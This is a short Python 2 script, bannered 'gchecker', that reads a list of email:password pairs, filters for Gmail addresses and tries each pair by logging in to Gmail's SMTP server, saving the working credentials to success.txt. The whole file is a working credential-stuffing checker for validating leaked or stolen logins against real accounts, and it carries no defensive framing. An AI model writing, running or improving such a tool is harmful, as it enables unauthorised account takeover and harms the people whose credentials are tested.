import os
import smtplib

def iniziale():
	os.system("clear")
	print """
            _               _             
           | |             | |            
  __ _  ___| |__   ___  ___| | _____ _ __ 
 / _` |/ __| '_ \ / _ \/ __| |/ / _ \ '__|
| (_| | (__| | | |  __/ (__|   <  __/ |   
 \__, |\___|_| |_|\___|\___|_|\_\___|_|   
  __/ |                                   
 |___/                                    
	"""
	print " "
iniziale()
cont = 0
succ = 0
diremail = raw_input("Email and password list: ")

l = open(diremail, "r")
em = l.readlines()
email = []
passw = []
for e in em:
	p = e.split(":")
	if "@gmail.com" in p[0]:
		email.append(p[0])
		d = p[1].replace("\n", "")
		passw.append(d)

while cont < len(email):
	s = smtplib.SMTP('smtp.gmail.com:587')
	s.starttls()
	try:
		s.login(email[cont], passw[cont])
	except:
		os.system("clear")
		iniziale()
		print "[no]", email[cont]
	else:
		f = open("success.txt", "w")
		f.write(email[cont]+":"+passw[cont])
		os.system("clear")
		iniziale()
		print "[yes] %s:%s" % (email[cont], passw[cont])
		succ = succ + 1
	cont = cont + 1

os.system("clear")
iniziale()
if succ > 0:
	print "%s live emails have been found, a file named 'success.txt' containing the credentials of these emails has been created." % (succ)
else:
	print "No email found"
